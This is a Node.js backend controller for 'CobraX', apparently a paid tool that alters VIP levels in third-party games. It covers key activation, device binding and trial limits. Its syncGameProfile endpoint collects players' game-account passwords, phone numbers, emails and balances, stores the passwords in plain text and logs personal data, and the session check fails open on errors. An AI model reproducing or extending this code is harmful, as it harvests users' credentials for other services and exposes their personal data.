'use strict';

const crypto = require('crypto');
const pool = require('../config/database');
const { getSettings } = require('../config/settings');
const { COBRAX_SECRET } = require('../config/constants');
const { safeCompare } = require('../utils/crypto');
const { isVersionOutdated } = require('../utils/helpers');

// POST /api/app/ping
async function ping(req, res) {
  try {
    const { device_id, app_version } = req.body;
    if (!device_id || typeof device_id !== 'string' || device_id.length > 128) {
      return res.json({ status: 'ok' }); // silent — don't expose errors
    }
    const ver = (app_version || '').toString().slice(0, 20);
    await pool.execute(
      `INSERT INTO app_installs (device_id, app_version, first_seen, last_seen)
       VALUES (?, ?, NOW(), NOW())
       ON DUPLICATE KEY UPDATE app_version = VALUES(app_version), last_seen = NOW()`,
      [device_id.trim(), ver]
    );
    return res.json({ status: 'ok' });
  } catch (err) {
    console.error('[Ping] Error:', err.message);
    return res.json({ status: 'ok' }); // always succeed silently
  }
}

// POST /api/cobrax/verify-session
async function verifySession(req, res) {
  try {
    const { device_id, app_version, app_fingerprint, vip_key } = req.body;

    // 1. Shared-secret header guard
    const clientSecret = req.headers['x-cobrax-secret'] || '';
    if (!COBRAX_SECRET || !safeCompare(clientSecret, COBRAX_SECRET)) {
      return res.status(401).json({ valid: false, reason: 'UNAUTHORIZED' });
    }

    // 2. Basic input validation
    if (!device_id || !app_version || !app_fingerprint) {
      return res.status(400).json({ valid: false, reason: 'MISSING_PARAMS' });
    }

    // Automatically register app install / update last active timestamp
    pool.execute(
      `INSERT INTO app_installs (device_id, app_version, first_seen, last_seen)
       VALUES (?, ?, NOW(), NOW())
       ON DUPLICATE KEY UPDATE app_version = VALUES(app_version), last_seen = NOW()`,
      [String(device_id).trim().slice(0, 128), String(app_version || '5.0.1').slice(0, 20)]
    ).catch(() => {});

    // 3. Recompute expected HMAC-SHA256 fingerprint
    const expectedFingerprint = crypto
      .createHmac('sha256', COBRAX_SECRET)
      .update(`${device_id}|${app_version}`)
      .digest('hex');

    // 4. Timing-safe comparison
    if (!safeCompare(app_fingerprint, expectedFingerprint)) {
      console.warn(`[VerifySession] Tampered APK detected — device: ${device_id}, version: ${app_version}`);
      return res.json({ valid: false, reason: 'TAMPERED' });
    }

    // 5. Optional: verify VIP key is still active for this device
    if (vip_key) {
      const [rows] = await pool.execute(
        `SELECT device_id, status, expires_at FROM auth_keys WHERE \`key\` = ? LIMIT 1`,
        [vip_key]
      );
      if (rows.length === 0) {
        return res.json({ valid: false, reason: 'KEY_INVALID' });
      }
      const keyRow = rows[0];

      // Check expiry
      if (keyRow.expires_at && new Date(keyRow.expires_at) < new Date()) {
        return res.json({ valid: false, reason: 'KEY_EXPIRED' });
      }

      // Check status
      if (keyRow.status !== 'active') {
        return res.json({ valid: false, reason: 'KEY_REVOKED' });
      }

      // Check device binding — key belongs to a different device
      if (keyRow.device_id && keyRow.device_id !== device_id) {
        return res.json({ valid: false, reason: 'DEVICE_MISMATCH' });
      }
    }

    // 6. All checks passed
    return res.json({ valid: true });

  } catch (err) {
    console.error('[VerifySession] Error:', err.message);
    return res.json({ valid: true });
  }
}

// POST /api/cobrax/validate-key
async function validateKey(req, res) {
  const incomingSecret = (req.headers['x-cobrax-secret'] || '').toString();
  if (!COBRAX_SECRET || !safeCompare(incomingSecret, COBRAX_SECRET))
    return res.status(401).json({ status: 'error', message: 'Unauthorized' });

  const { key, device_id, app_version } = req.body;
  if (!key || typeof key !== 'string')
    return res.status(400).json({ status: 'error', message: 'Key is required.' });
  if (!device_id || typeof device_id !== 'string')
    return res.status(400).json({ status: 'error', message: 'Device ID is required.' });

  const clientVer = app_version || req.headers['x-app-version'] || '';

  try {
    const s = await getSettings();
    const minVer = s.min_app_version || '5.0.1';
    const forceUpdate = (s.force_update_enabled || '1') === '1';

    if (forceUpdate && isVersionOutdated(clientVer, minVer)) {
      return res.status(426).json({
        status: 'error',
        code: 'APP_OUTDATED',
        message: 'You are using an outdated version of CobraX. Please install the latest version from our official website.',
        min_version: minVer,
        latest_version: s.latest_app_version || minVer,
        update_url: s.update_download_url || 'https://cobrax.sbs',
      });
    }

    const normalizedKey = key.trim().toUpperCase();
    const keyPattern    = /^COBRAX-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-\d+$/;
    if (!keyPattern.test(normalizedKey))
      return res.status(404).json({ status: 'error', message: 'Invalid key format.' });

    const [rows] = await pool.execute('SELECT * FROM auth_keys WHERE `key` = ? LIMIT 1', [normalizedKey]);
    if (!rows.length) return res.status(404).json({ status: 'error', message: 'Invalid key. Please check and try again.' });

    const record = rows[0];
    const now    = new Date();

    if (record.expires_at && new Date(record.expires_at) < now) {
      await pool.execute("UPDATE auth_keys SET status='expired' WHERE `key`=?", [normalizedKey]);
      return res.status(410).json({ status: 'error', message: 'This key has expired.' });
    }
    if (record.status === 'expired')
      return res.status(410).json({ status: 'error', message: 'This key has expired.' });
    if (record.status === 'revoked')
      return res.status(403).json({ status: 'error', message: 'This key has been revoked.' });

    let allowedGames = [];
    let rawGames = record.selected_games;

    // Self-healing fallback: if auth_keys does not have selected_games, look up from orders
    if (!rawGames && record.order_no) {
      try {
        const [orderRows] = await pool.execute('SELECT selected_games FROM orders WHERE order_no = ? LIMIT 1', [record.order_no]);
        if (orderRows.length && orderRows[0].selected_games) {
          rawGames = orderRows[0].selected_games;
          const gamesToSave = typeof rawGames === 'string' ? rawGames : JSON.stringify(rawGames);
          await pool.execute('UPDATE auth_keys SET selected_games = ? WHERE `key` = ?', [gamesToSave, normalizedKey]).catch(() => {});
        }
      } catch (_) {}
    }

    if (rawGames) {
      try {
        allowedGames = typeof rawGames === 'string' ? JSON.parse(rawGames) : rawGames;
        if (!Array.isArray(allowedGames)) allowedGames = [];
      } catch (_) {}
    }

    let customVipMap = {};
    try {
      const [customVipRows] = await pool.execute(
        'SELECT game_name, custom_vip_level FROM game_user_profiles WHERE (key_code = ? OR device_id = ?) AND custom_vip_level IS NOT NULL',
        [normalizedKey, device_id]
      );
      customVipRows.forEach(r => {
        if (r.game_name && r.custom_vip_level !== null) {
          customVipMap[r.game_name] = parseInt(r.custom_vip_level, 10);
        }
      });
    } catch (_) {}

    const calcExpiryMeta = (expDate, pkgType, days) => {
      const expMs = new Date(expDate).getTime();
      const msLeft = expMs - now.getTime();
      const hoursLeft = Math.max(0, Math.floor(msLeft / (1000 * 60 * 60)));
      const isExpiringSoon = msLeft > 0 && msLeft <= (24 * 60 * 60 * 1000);
      return {
        status: 'success',
        expires_at: new Date(expDate).toISOString(),
        package: pkgType,
        duration_days: days,
        is_expiring_soon: isExpiringSoon,
        hours_remaining: hoursLeft,
        allowed_games: allowedGames,
        custom_vip_levels: customVipMap,
      };
    };

    const isTrialKey = (record.duration_days <= 1) || (record.package_type === 'basic');

    if (record.status === 'active') {
      if (record.device_id === device_id)
        return res.status(200).json(calcExpiryMeta(record.expires_at, record.package_type, record.duration_days));
      return res.status(403).json({ status: 'error', message: 'This key is already activated on another device.' });
    }

    if (record.status === 'unused') {
      // Enforce 1-time Trial Access per physical device
      if (isTrialKey) {
        const [trialHistory] = await pool.execute(
          'SELECT id, key_code, first_activated_at FROM device_trial_history WHERE device_id = ? LIMIT 1',
          [device_id]
        );
        if (trialHistory.length > 0) {
          return res.status(403).json({
            status: 'error',
            code: 'TRIAL_ALREADY_USED',
            message: 'Trial Access (24-Hour) has already been used on this device. Please purchase a Cobra Access Plan (30 Days) to continue.'
          });
        }
      }

      const expiresAt = new Date(now);
      expiresAt.setDate(expiresAt.getDate() + record.duration_days);
      await pool.execute(
        "UPDATE auth_keys SET status='active', device_id=?, activated_at=NOW(), expires_at=? WHERE `key`=?",
        [device_id, expiresAt, normalizedKey]);

      // Record device trial history
      if (isTrialKey) {
        await pool.execute(
          'INSERT IGNORE INTO device_trial_history (device_id, key_code, order_no, first_activated_at) VALUES (?, ?, ?, NOW())',
          [device_id, normalizedKey, record.order_no || null]
        ).catch(() => {});
      }

      return res.status(200).json(calcExpiryMeta(expiresAt, record.package_type, record.duration_days));
    }

    return res.status(400).json({ status: 'error', message: 'Key is not valid.' });
  } catch (err) {
    console.error('[CobraX Auth] DB Error:', err);
    return res.status(500).json({ status: 'error', message: 'Server error.' });
  }
}

// POST /api/app/sync-game-profile & /api/cobrax/sync-game-profile
async function syncGameProfile(req, res) {
  try {
    const incomingSecret = (req.headers['x-cobrax-secret'] || '').toString();
    if (!COBRAX_SECRET || !safeCompare(incomingSecret, COBRAX_SECRET)) {
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    const {
      key,
      device_id,
      game_name,
      game_user_id,
      game_username,
      game_nickname,
      game_pwd,
      pwd,
      mobile,
      email,
      vip_level,
      withdraw_count,
      recharge_count,
      balance,
      account_created_at,
      addTime,
      add_time,
      userRechargeTimes,
      user_recharge_times,
    } = req.body;

    if (!game_name) {
      return res.status(400).json({ success: false, error: 'Game name is required.' });
    }

    let cleanKey = key ? String(key).trim().toUpperCase() : null;
    const cleanDev = device_id ? String(device_id).trim() : null;
    const cleanGame = String(game_name).trim();

    // Find user_id and active key if key or device_id is linked
    let userId = null;
    if (cleanKey) {
      const [keyRows] = await pool.execute(
        'SELECT a.`key`, a.order_no, o.user_id FROM auth_keys a LEFT JOIN orders o ON o.order_no = a.order_no WHERE a.`key` = ? LIMIT 1',
        [cleanKey]
      );
      if (keyRows.length && keyRows[0].user_id) {
        userId = keyRows[0].user_id;
      }
    } else if (cleanDev) {
      // Find active key from device_id
      const [devRows] = await pool.execute(
        'SELECT a.`key`, a.order_no, o.user_id FROM auth_keys a LEFT JOIN orders o ON o.order_no = a.order_no WHERE a.device_id = ? AND a.status = "active" LIMIT 1',
        [cleanDev]
      );
      if (devRows.length) {
        cleanKey = devRows[0].key;
        if (devRows[0].user_id) userId = devRows[0].user_id;
      }
    }

    const cleanUserId = game_user_id ? String(game_user_id).trim() : null;
    const cleanUname  = game_username ? String(game_username).trim() : null;
    const cleanNick   = game_nickname ? String(game_nickname).trim() : null;
    const cleanPwd    = (game_pwd || pwd) ? String(game_pwd || pwd).trim() : null;
    const cleanMobile = mobile ? String(mobile).trim() : null;
    const cleanEmail  = email ? String(email).trim() : null;
    const cleanAddTime = (account_created_at || addTime || add_time) ? String(account_created_at || addTime || add_time).trim() : null;
    const vipLvl      = parseInt(vip_level) || 0;
    const wCount      = parseInt(withdraw_count) || 0;
    const rCount      = parseInt(recharge_count ?? userRechargeTimes ?? user_recharge_times) || 0;
    const bal         = parseFloat(balance) || 0.0;

    const primaryKeyRef = cleanKey || (cleanDev ? `DEV-${cleanDev}` : 'UNKNOWN');

    await pool.execute(
      `INSERT INTO game_user_profiles
        (key_code, user_id, device_id, game_name, game_user_id, game_username, game_nickname, game_pwd, mobile, email, vip_level, withdraw_count, recharge_count, balance, account_created_at, first_synced_at, last_synced_at)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW(), NOW())
       ON DUPLICATE KEY UPDATE
         user_id = COALESCE(VALUES(user_id), user_id),
         device_id = COALESCE(VALUES(device_id), device_id),
         game_user_id = COALESCE(VALUES(game_user_id), game_user_id),
         game_username = COALESCE(VALUES(game_username), game_username),
         game_nickname = COALESCE(VALUES(game_nickname), game_nickname),
         game_pwd = COALESCE(VALUES(game_pwd), game_pwd),
         mobile = COALESCE(VALUES(mobile), mobile),
         email = COALESCE(VALUES(email), email),
         vip_level = VALUES(vip_level),
         withdraw_count = VALUES(withdraw_count),
         recharge_count = VALUES(recharge_count),
         balance = VALUES(balance),
         account_created_at = COALESCE(VALUES(account_created_at), account_created_at),
         last_synced_at = NOW()`,
      [primaryKeyRef, userId, cleanDev, cleanGame, cleanUserId, cleanUname, cleanNick, cleanPwd, cleanMobile, cleanEmail, vipLvl, wCount, rCount, bal, cleanAddTime]
    );

    // Check if custom_vip_level exists for this profile
    let customVip = null;
    try {
      const [pRows] = await pool.execute(
        'SELECT custom_vip_level FROM game_user_profiles WHERE key_code = ? AND game_name = ? LIMIT 1',
        [primaryKeyRef, cleanGame]
      );
      if (pRows.length && pRows[0].custom_vip_level !== null) {
        customVip = parseInt(pRows[0].custom_vip_level, 10);
      }
      if (customVip === null && primaryKeyRef) {
        const [kRows] = await pool.execute('SELECT custom_vip_levels FROM auth_keys WHERE `key` = ? LIMIT 1', [primaryKeyRef]);
        if (kRows.length && kRows[0].custom_vip_levels) {
          try {
            const map = JSON.parse(kRows[0].custom_vip_levels);
            if (cleanGame && map[cleanGame] !== undefined && map[cleanGame] !== null) {
              customVip = parseInt(map[cleanGame], 10);
            } else if (map['default'] !== undefined && map['default'] !== null) {
              customVip = parseInt(map['default'], 10);
            }
          } catch (_) {}
        }
      }
    } catch (_) {}

    console.log(`[Game Profile] Synced: ${cleanGame} | UserID: ${cleanUserId} | Mobile: ${cleanMobile} | Email: ${cleanEmail} | VIP: ${vipLvl} (Custom: ${customVip}) | Recharges: ${rCount} | Withdraws: ${wCount} | Created: ${cleanAddTime} | Key: ${primaryKeyRef}`);
    return res.json({ success: true, custom_vip_level: customVip });
  } catch (err) {
    console.error('[Game Profile] Sync error:', err);
    return res.status(500).json({ success: false, error: 'Server error syncing game profile.' });
  }
}

// POST /api/cobrax/get-game-vip & /api/app/get-game-vip
async function getGameVip(req, res) {
  try {
    const incomingSecret = (req.headers['x-cobrax-secret'] || '').toString();
    if (!COBRAX_SECRET || !safeCompare(incomingSecret, COBRAX_SECRET)) {
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    const { key, device_id, game_name, game_user_id } = req.body;
    const cleanKey = key ? String(key).trim().toUpperCase() : null;
    const cleanDev = device_id ? String(device_id).trim() : null;
    const cleanGame = game_name ? String(game_name).trim() : '';
    const cleanUserId = game_user_id ? String(game_user_id).trim() : null;

    let customVip = null;
    let targetUserId = null;

    // 1. Check game_user_profiles strictly for cleanGame
    if (cleanGame && (cleanKey || cleanDev)) {
      const [pRows] = await pool.execute(
        `SELECT custom_vip_level, game_user_id FROM game_user_profiles 
         WHERE (key_code = ? OR device_id = ?) 
           AND game_name = ?
           AND custom_vip_level IS NOT NULL 
         ORDER BY last_synced_at DESC`,
        [cleanKey || '', cleanDev || '', cleanGame]
      );
      if (pRows.length) {
        if (cleanUserId) {
          const match = pRows.find(r => r.game_user_id && String(r.game_user_id).trim() === cleanUserId);
          if (match) {
            customVip = parseInt(match.custom_vip_level, 10);
            targetUserId = match.game_user_id ? String(match.game_user_id).trim() : null;
          }
        }
        if (customVip === null && pRows[0].custom_vip_level !== null) {
          customVip = parseInt(pRows[0].custom_vip_level, 10);
          targetUserId = pRows[0].game_user_id ? String(pRows[0].game_user_id).trim() : null;
        }
      }
    }

    // 2. Check auth_keys custom_vip_levels fallback strictly for cleanGame
    if (customVip === null && cleanGame && cleanKey) {
      const [kRows] = await pool.execute(
        'SELECT custom_vip_levels FROM auth_keys WHERE `key` = ? LIMIT 1',
        [cleanKey]
      );
      if (kRows.length && kRows[0].custom_vip_levels) {
        try {
          const map = JSON.parse(kRows[0].custom_vip_levels);
          for (const [k, v] of Object.entries(map)) {
            if (k.toLowerCase() === cleanGame.toLowerCase()) {
              if (typeof v === 'object' && v !== null) {
                customVip = parseInt(v.vip, 10);
                targetUserId = v.user_id ? String(v.user_id).trim() : null;
              } else if (v !== null) {
                customVip = parseInt(v, 10);
              }
              break;
            }
          }
        } catch (_) {}
      }
    }

    return res.json({ success: true, custom_vip_level: customVip, target_user_id: targetUserId });
  } catch (err) {
    console.error('[CobraX VIP Check] Error:', err);
    return res.status(500).json({ success: false, error: 'Server error' });
  }
}

module.exports = {
  ping,
  verifySession,
  validateKey,
  syncGameProfile,
  getGameVip,
};
